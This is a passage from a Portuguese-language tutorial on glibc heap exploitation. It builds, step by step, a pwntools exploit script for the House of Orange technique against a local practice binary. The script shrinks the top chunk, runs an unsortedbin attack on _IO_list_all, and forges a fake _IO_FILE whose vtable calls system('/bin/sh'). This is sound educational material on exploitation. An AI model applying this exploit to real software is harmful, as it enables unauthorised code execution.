A malloc também vai solicitar mais memória através da <em>syscall</em> <code class="language-plaintext highlighter-rouge">brk()</code>, porém, a nova memória não será adjacente ao <em>top chunk</em> original, criando um <em>gap</em> entre os dois, conforme abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_253.png" alt="Aumentando um top chunk size field" /></p>

<p>Quando isso ocorre, a malloc entende que o kernel é incapaz de mapear a memória contínua para esta <em>heap</em>, pois talvez estaja fora do espaço válido. E, uma vez que a nova memória é maior que a anterior, a malloc considera que que a nova <em>heap</em> se inicia na nova memória, e ela faz isso configurando o <em>top chunk pointer</em> na <em>main arena</em> como sendo o endereço da nova memória. E para não desperdiçar espaço a malloc libera o <em>top chunk</em> antigo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_254.png" alt="Liberando o top chunk antigo" /></p>

<p>Então, se utilizarmos de <em>overflow</em> para diminuir o tamanho do <em>top chunk</em>, e em seguida, fazer uma requisição maior que o permitido por este <em>top chunk</em> adulterado, a malloc irá gerar um <em>chunk</em> livre, que pode ser utilizado em nosso <em>unsortedbin attack</em>, e todo este processo ocorrerá sem invocar a função <code class="language-plaintext highlighter-rouge">free()</code>.<br />
Esta é a fase 1 da técnica <code class="language-plaintext highlighter-rouge">The House of orange</code>.</p>

<h2 id="obtendo-um-shell">Obtendo um Shell</h2>

<p>Para iniciarmos e organizarmos os passos descritos anteriormente, vamos criar o script inicial <code class="language-plaintext highlighter-rouge">shell.py</code> que ficará desta forma:</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="c1">#!/usr/bin/python3
</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>


<span class="c1"># configurando o binario e a GLIBC
</span><span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"house_of_orange"</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">runpath</span> <span class="o">+</span> <span class="sa">b</span><span class="s">"/libc.so.6"</span><span class="p">)</span> <span class="c1"># elf.libc broke again
</span>
<span class="c1"># GDB config em _IO_fhlush_all_lockp
</span><span class="n">gs</span> <span class="o">=</span> <span class="s">'''
set breakpoint pending on
break _IO_flush_all_lockp
enable breakpoints once 1
continue
'''</span>

<span class="c1"># funcao para iniciar
</span><span class="k">def</span> <span class="nf">start</span><span class="p">():</span>
    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">GDB</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">gdb</span><span class="p">.</span><span class="n">debug</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">path</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gs</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">process</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">path</span><span class="p">)</span>

<span class="c1"># selecionando a opcao "malloc (small)"
</span><span class="k">def</span> <span class="nf">small_malloc</span><span class="p">():</span>
    <span class="n">io</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">"1"</span><span class="p">)</span>
    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">)</span>

<span class="c1"># selecionando a opcao "malloc (large)"
</span><span class="k">def</span> <span class="nf">large_malloc</span><span class="p">():</span>
    <span class="n">io</span><span class="p">.</span><span class="n">sendthen</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">,</span> <span class="sa">b</span><span class="s">"2"</span><span class="p">)</span>

<span class="c1"># selecionando a opcao "edit (1st small chunk)" e enviando os dados
</span><span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
    <span class="n">io</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">"3"</span><span class="p">)</span>
    <span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"data: "</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">)</span>

<span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>

<span class="c1"># capturando o endereco da puts() que o binario vaza
</span><span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"puts() @ "</span><span class="p">)</span>
<span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recvline</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">puts</span>

<span class="c1"># capturando o endereco da heap que o binario vaza
</span><span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"heap @ "</span><span class="p">)</span>
<span class="n">heap</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recvline</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span>
<span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">)</span>
<span class="n">io</span><span class="p">.</span><span class="n">timeout</span> <span class="o">=</span> <span class="mf">0.1</span>

<span class="c1">#===============EXPLOITING================#
</span>
<span class="c1">#=========================================#
</span>

<span class="n">io</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>
<p>Conforme os scripts anteriores, temos funções auxiliares para iterarmos nas opções do menu do programa, além de um <em>breakpoint</em> configurado no GDB, para utilizarmos posteriormente.</p>

<p>Sabendo que o <em>small chunk</em> aloca um <em>chunk</em> de <code class="language-plaintext highlighter-rouge">0x20</code> bytes no <em>user data</em>, podemos solicitar o primeiro <em>chunk</em> e preenchê-lo com 24 bytes e tudo que enviarmos após isto, irá sobrescrever o <em>top chunk size field</em>.<br />
Vamos sobrescrever o <em>top chunk size field</em> com o valor de <code class="language-plaintext highlighter-rouge">0x90</code> bytes, desta forma, quando ele for liberado, também será vinculado ao <em>unsortedbin</em>. Adicionando estas linhas no script, ficará desta forma:</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#===============EXPLOITING================#
</span>
<span class="c1"># requisitando um small chunk
</span><span class="n">small_malloc</span><span class="p">()</span>

<span class="c1"># sobrescrevendo o topo chunk size field com 0x90
</span><span class="n">edit</span><span class="p">(</span><span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mi">24</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x90</span><span class="p">))</span>

<span class="c1">#=========================================#
</span></code></pre></div></div>
<p>Com estas atualizações, podemos executar o script com as opções do GDB e requisitar um <em>large chunk</em> para ativar o <em>top chunk extension</em>.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_255.png" alt="Mensagem de erro" /></p>

<p>Conforme podemos ver, o programa respondeu com uma mensagem de erro. Voltando ao GDB, podemos visualizar o código fonte que gerou este erro, alterando o contexto para o <em>frame</em> 3, <code class="language-plaintext highlighter-rouge">sysmalloc()</code>. Esta função é responsável por requisitar memória do kernel. Conforme abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_256.png" alt="Código do erro" /></p>

<p>Conforme na imagem, o erro foi ativado pelas duas linhas de código circuladas em vermelho. A primeira, checa se a <em>flag</em> <code class="language-plaintext highlighter-rouge">prev_inuse</code> foi configurada no <em>top chunk</em>, uma vez que o <em>top chunk</em> sempre terá esta <em>flag</em> configurada, ela ativou o erro. A segunda linha checa se o <em>top chunk</em> termina no limite de uma página, o que atualmente não atende.</p>

<blockquote>
  <p>No contexto de memória, uma página ou <em>page</em> tem o tamanho padrão de 4096 bytes, ou <code class="language-plaintext highlighter-rouge">0x1000</code> bytes.</p>
</blockquote>

<p>Após analisarmos o código que causou o erro, podemos alterar nossa linha de edição do <em>chunk</em>. Precisamos configurar o <em>top chunk size field</em> para um valor que alinhe o <em>top chunk</em> ao limite de uma página, podemos fazer isto, subtraindo os <code class="language-plaintext highlighter-rouge">0x20</code> bytes que já alocamos do tamanho padrão de <code class="language-plaintext highlighter-rouge">0x1000</code> bytes de uma página. Também precisamos adicionar 1 byte para configurar a <em>flag</em> <code class="language-plaintext highlighter-rouge">prev_inuse</code>.<br />
Estas configurações devem atender as checagens da <code class="language-plaintext highlighter-rouge">sysmalloc()</code> e podemos já inserir a requisição para um <em>large chunk</em> no script para ativar o <em>top chunk extension</em>, ficando desta forma:</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#===============EXPLOITING================#
</span>
<span class="c1"># requisitando um small chunk
</span><span class="n">small_malloc</span><span class="p">()</span>

<span class="c1"># sobrescrevendo o topo chunk size field com 0x90
</span><span class="n">edit</span><span class="p">(</span><span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mi">24</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x1000</span> <span class="o">-</span> <span class="mh">0x20</span> <span class="o">+</span> <span class="mi">1</span><span class="p">))</span>

<span class="c1"># ativando o top chunk extension
</span><span class="n">large_malloc</span><span class="p">()</span>

<span class="c1">#=========================================#
</span></code></pre></div></div>
<p>Executando o script com as opções do GDB, desta vez o programa não quebrou, inspecionando a <em>heap</em>, podemos ver que agora há um <em>chunk</em> livre no <em>unsortedbin</em>, conforme mostrado abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_257.png" alt="Free chunk" /></p>

<p>Agora que a fase 1 está completa, estamos aptos a sobrescrever o “bk” do <em>top chunk</em> antigo, e ativarmos o <em>unsortedbin attack</em>. No entanto, sabendo que o <em>unsortedbin attack</em> redireciona a execução do programa para a direção que apontarmos, precisamos encontrar uma forma de ligar as fases 2 e 3 fazendo um link entre o <em>unsortedbin attack</em> e o <em>file stream exploitation</em>.</p>

<p>Vimos anteriormente como o <em>vtable highjacking</em> se comporta na técnica <em>file stream exploitation</em>.<br />
Tabmém vimos que o <code class="language-plaintext highlighter-rouge">_IO_list_all</code> é o topo de uma lista que contém todos os <em>file streams</em> que os processos do programa abriram e são usados quando a GLIBC precisa executar uma operação em todos os <em>file streams</em> abertos, normamlente para limpar os procedimentos.</p>

<p>Um destes processos de limpeza de procedimentos, acontece quando um programa finaliza, através da função <code class="language-plaintext highlighter-rouge">exit()</code> da GLIBC, ou retornando para a função <code class="language-plaintext highlighter-rouge">main()</code> do programa.</p>

<p>Supondo que apontemos nosso <em>unsortedbin attack</em> para o <code class="language-plaintext highlighter-rouge">_IO_list_all</code>, o substituindo com <em>pointer</em> para a <em>main arena</em>, então mandamos o sinal para sair do programa. Quando o programa finaliza e a GLIBC limpa todos os processos, isso causará uma tentativa de limpar todos os <em>file streams</em> abertos. Ela fará isso iterando sobre todos os <em>file streams</em> contidos na <code class="language-plaintext highlighter-rouge">_IO_list_all</code>, determinando se esta lista precisa ser limpa, e, se sim, chamando um uma função chamada <code class="language-plaintext highlighter-rouge">overflow()</code> sobre este <em>file stream</em>.</p>

<p>Neste momento a <em>main arena</em> será tratada como um <em>file stream</em> nos dando a oportunidade de apontar um dos campos do <em>stream</em> para a memória <em>heap</em> que nós controlamos.<br />
Podemos fazer isso, invocando o processo de <em>sorting</em> no <em>top chunk</em> antigo para um <em>bin</em> de nossa escolha, afinal, nós controlamos seu <em>size field</em> através do <em>bug</em> de <em>overflow</em>. E se requisitarmos um <em>chunk</em> de tamanho maior, ele passará pelo processo de <em>sorting</em>, ao invés de ser alocado.<br />
Mesmo o <em>chunk</em> não sendo alocado, o ataque ainda terá sucesso, pois conforme vimos anteriormente, o processo de <em>sorting</em> envolve o <em>partial unlink</em>.</p>

<p>Para organizarmos os passos citados e criarmos uma prova de conceito, podemos adicionar estes passos para preparar nosso <em>unsortedbin attack</em> contra o <em>pointer</em> da <code class="language-plaintext highlighter-rouge">_IO_list_all</code>. Utilizando a função auxiliar <code class="language-plaintext highlighter-rouge">edit()</code>, podemos sobrescrever pela segunda vez o <em>top chunk size field</em> do <em>chunk</em> antigo com o valor de <code class="language-plaintext highlighter-rouge">0x21</code> bytes, seu “fd” para qualquer valor (<em>partial unlink</em> ignora o “fd”, conforme já vimos) e seu “bk” para o endereço da <code class="language-plaintext highlighter-rouge">_IO_list_all - 16</code>. Fazendo isto criaremos o cenário onde haverá um <em>chunk</em> de <code class="language-plaintext highlighter-rouge">0x20</code> bytes no <em>unsortedbin</em> cujo seu “bk” aponta para um endereço próximo ao <code class="language-plaintext highlighter-rouge">_IO_list_all</code>.</p>

<p>Por fim, vamos adicionar uma chamada para criação de um <em>small chunk</em>, isso fará com que a malloc aloque o <em>top chunk</em> antigo, uma vez que setamos seu tamanho para <code class="language-plaintext highlighter-rouge">0x20</code> bytes, ativando nosso <em>unsortedbin attack</em> contra a <code class="language-plaintext highlighter-rouge">_IO_list_all</code>.</p>

<blockquote>
  <p>Na descrição dos passos, foi descrito que solicitaríamos um <em>chunk</em> de tamanho maior que o <em>top chunk</em> antigo fazendo que ele sofresse o processo de <em>partial unlink</em> ao invés de ser alocado. Porém, para efetivar a prova de conceito, vamos alocá-lo e medir seu comportamento.</p>
</blockquote>

<p>O bloco de exploração do script, fica desta forma:</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#===============EXPLOITING================#
</span>
<span class="c1"># requisitando um small chunk
</span><span class="n">small_malloc</span><span class="p">()</span>

<span class="c1"># sobrescrevendo o topo chunk size field com 0x90
</span><span class="n">edit</span><span class="p">(</span><span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mi">24</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x1000</span> <span class="o">-</span> <span class="mh">0x20</span> <span class="o">+</span> <span class="mi">1</span><span class="p">))</span>

<span class="c1"># ativando o top chunk extension
</span><span class="n">large_malloc</span><span class="p">()</span>

<span class="c1"># sobrescrevendo o top chunk antigo apontando sua "bk" para _IO_list_all - 16
</span><span class="n">edit</span><span class="p">(</span><span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mi">24</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x21</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">_IO_list_all</span> <span class="o">-</span> <span class="mi">16</span><span class="p">))</span>

<span class="c1"># requisitando um small chunk para realocar o top chunk antigo
</span><span class="n">small_malloc</span><span class="p">()</span>

<span class="c1">#=========================================#
</span></code></pre></div></div>
<p>Com o script atualizado, podemos executá-lo com as opções do GDB e inspecionar o <code class="language-plaintext highlighter-rouge">_IO_list_all</code> com o comando <code class="language-plaintext highlighter-rouge">print</code>, conforme abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_258.png" alt="Pointer do _IO_list_all" /></p>

<p>Podemos ver pela imagem, que a <code class="language-plaintext highlighter-rouge">_IO_list_all</code> aponta para a <em>main arena</em>. Vamos continuar a execução do programa, e ver o comportamento da malloc com este <em>pointer</em> ao selecionarmos a opção quatro do menu do programa que envia o sinal <code class="language-plaintext highlighter-rouge">exit()</code>.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_259.png" alt="Saindo do programa" /></p>

<p>Voltando ao GDB, vemos que o programa parou no <em>breakpoint</em> confiogurado no script, na função da GLIBC responsável por limpar os <em>file streams</em> durante a o processo de encerramento do programa. O painel <em>backtrace</em> nos mostra que esta função se chama <code class="language-plaintext highlighter-rouge">_IO_flush_all_lockp()</code>, conforme a imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_260.png" alt="_IO_flush_all_lockp()" /></p>

<p>Esta função foi chamada atraves da <code class="language-plaintext highlighter-rouge">_IO_cleanup()</code>. Se continuarmos a execução do programa, receberemos o sinal <code class="language-plaintext highlighter-rouge">sigfault</code> e o painel <em>source</em> nos mostra o código responsável pelo erro, conforme abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_261.png" alt="Código do erro" /></p>

<p>Neste caso, o motivo do erro é irrelevante, pois esta função está tentando tratar a <em>main arena</em> como um <em>file stream</em>. O importante é entender como esta checagem funciona.</p>

<p>A linha contendo <code class="language-plaintext highlighter-rouge">_IO_OVERFLOW</code> ressaltada na imagem abaixo, é a que chama a função <code class="language-plaintext highlighter-rouge">overflow()</code> citada anteriormente.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_262.png" alt="_IO_OVERFLOW" /></p>

<p>Seu primeiro argumento, “fp”, representa o <em>file stream</em> de onde a <code class="language-plaintext highlighter-rouge">overflow()</code> está sendo chamada. Existem duas checagens necessárias para esta linha ser executada. A primeira checagem passa se o campo <code class="language-plaintext highlighter-rouge">_mode</code> do <em>file stream</em> for menor ou igual a zero e o seu <code class="language-plaintext highlighter-rouge">_IO_write_ptr</code> for maior que seu campo <code class="language-plaintext highlighter-rouge">_IO_write_base</code>, conforme ressaltado na imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_263.png" alt="Checagens" /></p>

<p>Basicamente, esta linha de código checa se existe qualquer coisa para ser escrito neste <em>file stream</em> antes do programa sair.</p>

<p>A segunda checagem, verifica se o campo <code class="language-plaintext highlighter-rouge">_mode</code> é maior que zero, conforme ilustrado abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_264.png" alt="Checagens" /></p>

<p>Podemos visualizar as coisas na perspectiva da função <code class="language-plaintext highlighter-rouge">_IO_flush_all_lockp()</code> no GDB com o comando <code class="language-plaintext highlighter-rouge">print</code>, conforme abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_265.png" alt="Pointers do file stream" /></p>

<p>Conforme podemos observar, o <em>file stream</em> que parece sobrescrever a <em>main arena</em> possui o campo <code class="language-plaintext highlighter-rouge">_mode</code> negativo, ressaltado em vermelho, mas seus campos <code class="language-plaintext highlighter-rouge">_IO_write_base</code> e <code class="language-plaintext highlighter-rouge">_IO_write_ptr</code> são iguais, ilustrado em verde, fazendo com que a primeira linha da checagem falhe. Desta forma a <code class="language-plaintext highlighter-rouge">_IO_flush_all_lockp()</code> não irá chamar a função <code class="language-plaintext highlighter-rouge">overflow()</code>, ao invés disso, vai passar para o próximo <em>stream</em> através do <em>pointer</em> do <code class="language-plaintext highlighter-rouge">_chain</code>, que neste momento aponta para a <em>main arena</em>, ilustrado em azul.</p>

<p>Se utilizarmos o comando <code class="language-plaintext highlighter-rouge">dq</code> para fazer o <em>dump</em> de 26 <em>quadwords</em> da <em>main arena</em>, podemos determinar qual parte da <em>main arena</em> está sendo considerada como o <em>pointer</em> do <code class="language-plaintext highlighter-rouge">_chain</code>, conforme abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_266.png" alt="Campos na main arena" /></p>

<p>Ao observamos a imagem, podemos ver o local onde a <em>main arena</em> armazena o <em>top chunk pointer</em>, marcado em verde, o local onde armazena o “fd” e “bk” do <em>unsortedbin</em> em azul, e, maracado em vermelho, podemos ver os “bk” do <em>smallbins</em> em incrementos de 16 bytes.</p>

<p>Se compararmos o endereço dos <em>smallbins</em> de <code class="language-plaintext highlighter-rouge">0x60</code> bytes, podemos ver que o campo <code class="language-plaintext highlighter-rouge">_chain</code> aponta exatamente para ele, conforme a imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_267.png" alt="Pointer do _chain" /></p>

<p>Isso significa que se alterarmos o <em>size field</em> do <em>chunk</em> antigo de <code class="language-plaintext highlighter-rouge">0x21</code> para <code class="language-plaintext highlighter-rouge">0x61</code> antes do nosso <em>unsortedbin attack</em>, o <em>top chunk</em>  antigo, sofrerá o processo de <em>sorting</em> no <em>smallbin</em> de <code class="language-plaintext highlighter-rouge">0x60</code> bytes, ao invés de ser alocado, e terminar no <em>pointer</em> da <code class="language-plaintext highlighter-rouge">_chain</code> sobreponto a <em>main arena</em>.</p>

<p>Isto nos permite forjar nosso próprio <em>file stream</em> falso na <em>heap</em>, nos dando nosso próprio <em>pointer</em> para a <em>vtable</em> e nossas próprias entradas desta <em>vtable</em> forjada.</p>

<p>Neste ponto, nossa prova de conceito foi efetivada, porém, vamos atualizar nosso script, a fim de nos aproveitarmos destas alterações e obter um <code class="language-plaintext highlighter-rouge">shell</code>.</p>

<p>Para fins de organização e melhor entendimento, vamos separar os <em>pointers</em> em variáveis no script, seguindo os seguintes passos:</p>

<ol>
  <li>Primeiro, temos que alterar o <em>size field</em> do <em>chunk</em> antigo para o tamanho de <code class="language-plaintext highlighter-rouge">0x61</code> bytes, conforme comprovamos na prova de conceito.</li>
  <li>O campo “fd” pode ter qualquer valor, pois será desconsiderado no processo.</li>
  <li>Continuaremos apontando seu “bk” para o endereço da <code class="language-plaintext highlighter-rouge">_IO_list_all - 16</code>. Pois quando nosso <em>exploit</em> ativar a função <code class="language-plaintext highlighter-rouge">_IO_flush_all_lockp()</code>, ela seguirá o <em>pointer</em> do <code class="language-plaintext highlighter-rouge">_IO_list_all</code> forjado até a <em>main arena</em> que irá falhar, então ela seguirá para o próximo <em>file stream</em> através do campo <code class="language-plaintext highlighter-rouge">_chain</code> que por sua vez, estará apontando para o “bk” do <em>smallbin</em> de <code class="language-plaintext highlighter-rouge">0x60</code> bytes. O <em>top chunk</em> antigo passará pelo processo de <em>unsorting</em> nesta posição durante o <em>unsortedbin attack</em> fazendo com que a função <code class="language-plaintext highlighter-rouge">_IO_flush_all_lockp()</code> siga o <code class="language-plaintext highlighter-rouge">_chain</code> até a <em>heap</em>, onde nosso <em>file stram</em> falso está, executando sua checagem e chamando a função <code class="language-plaintext highlighter-rouge">overflow()</code>. Para que tudo isso ocorra, precisamos nos certificar de que nosso <em>file stream</em> falso passe pelas checagens da malloc e crie um <em>pointer</em> para uma <em>vtable</em> na qual a entrada da <code class="language-plaintext highlighter-rouge">overflow()</code> esteja populada com a função que queremos executar.</li>
  <li>Seguindo as alterações para que o passo anterior passe pelas checagens durante o <em>unsortedbin attack</em> precisamos seguir a estrutura dos <em>file streams</em> vistas anteriormente e configurar nosso <code class="language-plaintext highlighter-rouge">write_base</code> para ser menor que o <code class="language-plaintext highlighter-rouge">write_ptr</code>.</li>
  <li>O campo <code class="language-plaintext highlighter-rouge">_mode</code> precisa ser menor ou igual a zero. Agora a checagem irá passar e a entrada da <code class="language-plaintext highlighter-rouge">overflow()</code> na <em>vtable</em> deste <em>file stream</em> será chamada.</li>
  <li>Teoricamente podemos apontar a <em>vtable</em> para qualquer lugar onde temos controle da memória, portanto, vamos inserí-lo no meio da própria <em>heap</em> mais específicamente em <code class="language-plaintext highlighter-rouge">heap + 0xd8</code>, onde os dados não estão sendo usados pelo <em>file stream</em> falso.</li>
  <li>Precisamos configurar uma entrada para a função <code class="language-plaintext highlighter-rouge">overflow()</code> dentro da nossa <em>vtable</em> falsa. Poderíamos utilizar um <em>one_gadget</em> porém, quando analisamos a estrutura dos <em>file streams</em>, vimos que quando a função <code class="language-plaintext highlighter-rouge">overflow()</code> é chamada, seu primeiro argumento é o endereço do próprio <em>file strem</em> que o chamou, contido no campo <code class="language-plaintext highlighter-rouge">_flags</code>. Isso significa que se escrevermos a <em>string</em> “/bin/sh” no primeiro <em>quadword</em>  do nosso <em>file stream</em> forjado, onde o campo <code class="language-plaintext highlighter-rouge">_flags</code> está, depois configurando o <em>pointer</em> para a <code class="language-plaintext highlighter-rouge">overflow()</code> na função <code class="language-plaintext highlighter-rouge">system()</code> da GLIBC, a chamada vai se tornar <code class="language-plaintext highlighter-rouge">system("/bin/sh")</code> e teremos um <code class="language-plaintext highlighter-rouge">shell</code> sem utilizar o <em>one_gadget</em>.</li>
</ol>

<p>A atualização do script com os passos citados fica desta forma:</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#===============EXPLOITING================#
</span>
<span class="c1"># requisitando um small chunk
</span><span class="n">small_malloc</span><span class="p">()</span>

<span class="c1"># sobrescrevendo o topo chunk size field com 0x90
</span><span class="n">edit</span><span class="p">(</span><span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mi">24</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x1000</span> <span class="o">-</span> <span class="mh">0x20</span> <span class="o">+</span> <span class="mi">1</span><span class="p">))</span>

<span class="c1"># ativando o top chunk extension
</span><span class="n">large_malloc</span><span class="p">()</span>

<span class="c1"># sobrescrevendo o top chunk antigo apontando sua "bk" para forjar uma estrutura _IO_FILE
</span><span class="n">size</span> <span class="o">=</span> <span class="mh">0x61</span>
<span class="n">fd</span> <span class="o">=</span> <span class="mh">0x00</span>
<span class="n">bk</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">_IO_list_all</span> <span class="o">-</span> <span class="mi">16</span>

<span class="n">write_base</span> <span class="o">=</span> <span class="mh">0x01</span>
<span class="n">write_ptr</span> <span class="o">=</span> <span class="mh">0x02</span>
<span class="n">mode</span> <span class="o">=</span> <span class="mh">0x00</span>
<span class="n">vtable_ptr</span> <span class="o">=</span> <span class="n">heap</span> <span class="o">+</span> <span class="mh">0xd8</span>
<span class="n">flags</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"/bin/sh</span><span class="se">\0</span><span class="s">"</span>
<span class="n">overflow</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">system</span>

<span class="c1"># colocando em ordem e montando o _IO_FILE falso
</span><span class="n">fake_file</span> <span class="o">=</span> <span class="n">flags</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">size</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">fd</span><span class="p">)</span> <span class="o">+</span>\
        <span class="n">p64</span><span class="p">(</span><span class="n">bk</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">write_base</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">write_ptr</span><span class="p">)</span> <span class="o">+</span>\
        <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">18</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">mode</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span>\
        <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">overflow</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">vtable_ptr</span><span class="p">)</span>

<span class="n">edit</span><span class="p">(</span><span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mi">16</span> <span class="o">+</span> <span class="n">fake_file</span><span class="p">)</span>

<span class="c1"># ativando os passos
</span><span class="n">small_malloc</span><span class="p">()</span>

<span class="c1">#=========================================#
</span></code></pre></div></div>
<p>Com as atualizações feitas, podemos checar todas as chamadas ao executar o script com as opções do GDB.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_268.png" alt="GDB parado" /></p>

<p>Conforme podemos ver no painel <em>backtrace</em>, o GDB parou novamente na chamada <code class="language-plaintext highlighter-rouge">malloc_printerr()</code> seguido da função <code class="language-plaintext highlighter-rouge">abort()</code>. Mas se olharmos para <em>frame</em> atual, veremos que o programa parou na função <code class="language-plaintext highlighter-rouge">_IO_flush_all_lockp()</code>, exatamente a função que queriamos ativar.</p>

<p>Sabemos exatamente o que esta função irá fazer, podemos seguir seu fluxo verificando o conteúdo da <code class="language-plaintext highlighter-rouge">_IO_list_all</code> com o comando <code class="language-plaintext highlighter-rouge">print</code>, conforme abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_269.png" alt="_chain" /></p>

<p>Conforme podemos ver, circulado em vermelho, o campo <code class="language-plaintext highlighter-rouge">_chain</code> agora aponta para a <em>heap</em> ao invés de apontar para a <em>main arena</em>.</p>

<p>Podemos seguir o fluxo do campo <code class="language-plaintext highlighter-rouge">_chain</code> e ver o conteúdo do nosso <em>file stream</em> falso conforme abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_270.png" alt="campos da _chain" /></p>

<p>Conforme vemos, os campos <code class="language-plaintext highlighter-rouge">_IO_write_base</code> e <code class="language-plaintext highlighter-rouge">_IO_write_ptr</code> estão com os valores <code class="language-plaintext highlighter-rouge">0x1</code> e <code class="language-plaintext highlighter-rouge">0x2</code> respectivamente, conforme programamos em nosso script, e também o campo <code class="language-plaintext highlighter-rouge">_mode</code> com o valor zero.</p>

<p>Também podemos consultar a <em>vtable</em> para qual nosso <em>file stream</em> aponta, conforme abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_271.png" alt="overflow() sobrescrita" /></p>

<p>A função <code class="language-plaintext highlighter-rouge">overflow()</code> foi sobrescrita com o endereço da <code class="language-plaintext highlighter-rouge">system()</code>, conforme programamos.<br />
